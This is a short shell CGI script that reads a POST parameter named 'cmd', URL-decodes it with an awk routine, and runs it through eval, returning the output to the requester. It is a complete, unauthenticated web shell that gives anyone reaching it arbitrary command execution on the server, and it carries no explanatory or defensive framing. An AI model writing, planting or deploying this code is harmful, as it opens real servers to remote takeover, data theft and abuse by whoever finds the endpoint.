#!/bin/sh
decode_url() {
    awk 'BEGIN{for(i=0;i<10;i++)hex[i]=i;for(i=0;i<6;i++){hex[sprintf("%c",i+97)]=i+10;hex[sprintf("%c",i+65)]=i+10;}}
    {
        gsub(/\+/, " ");
        res=""
        for(i=1;i<=length($0);i++) {
            c=substr($0,i,1)
            if(c=="%"){
                if(i+2<=length($0)){
                    h1=substr($0,i+1,1); h2=substr($0,i+2,1);
                    if(h1 in hex && h2 in hex) {
                        res=res sprintf("%c", hex[h1]*16 + hex[h2])
                        i+=2
                        continue
                    }
                }
            }
            res=res c
        }
        print res
    }'
}

if [ "$REQUEST_METHOD" = "POST" ]; then
    read -r POST_BODY
    CMD=$(echo "$POST_BODY" | sed -n 's/^cmd=\(.*\)$/\1/p' | decode_url)
fi

echo "Content-Type: text/plain"
echo ""

if [ -n "$CMD" ]; then
    echo "\$ $CMD"
    eval "$CMD" 2>&1
fi
